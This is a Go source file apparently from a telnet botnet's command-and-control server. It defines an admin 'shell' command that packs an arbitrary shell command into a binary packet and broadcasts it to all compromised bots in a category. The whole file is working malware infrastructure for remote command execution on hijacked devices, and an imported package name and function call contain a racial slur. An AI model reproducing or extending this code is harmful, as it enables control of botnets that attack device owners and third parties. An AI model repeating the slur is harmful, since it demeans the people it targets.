package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"advanced-telnet-cnc/source/niggers"
	"encoding/binary"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"shell", "execute", "sh"},
		Description: "Executes a shell command on bots within a specific category.",
		Admin:       true,
		Usage: []command.Argument{
			{Name: "category", Optional: false},
			{Name: "command", Optional: false},
		},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) < 2 {
				return command.ErrNotEnoughArguments
			}

			category := args[0]
			cmd := strings.Join(args[1:], " ")

			// Packet structure for Shell Command (ID 0xFB)
			// [1B ID][2B Time][1B TargetCount][1B OptionCount][1B OptID][1B OptLen][OptVal]

			buf := make([]byte, 0)
			buf = append(buf, 0xFB) // Shell Command ID

			// Time (2 bytes) = 0
			tmp := make([]byte, 2)
			binary.BigEndian.PutUint16(tmp, 0)
			buf = append(buf, tmp...)

			// Target Count (1 byte) = 0
			buf = append(buf, 0)

			// Option Count (1 byte) = 1
			buf = append(buf, 1)

			// Option 1 ID (1 byte) = 133 (Shell Command)
			buf = append(buf, 133)

			// Option 1 Len (1 byte)
			buf = append(buf, uint8(len(cmd)))

			// Option 1 Val
			buf = append(buf, []byte(cmd)...)

			// Add total length prefix correctly
			finalBuf := make([]byte, 2)
			binary.BigEndian.PutUint16(finalBuf, uint16(len(buf)))
			finalBuf = append(finalBuf, buf...)

			devicesSentTo := niggers.BroadcastAttack(finalBuf, category, "", -1)

			session.Printf("\x1b[32m[\x1b[37m!\x1b[32m] Sent shell command to %d bots in category '%s'.\x1b[0m\r\n", devicesSentTo, category)
			return nil
		},
	})
}
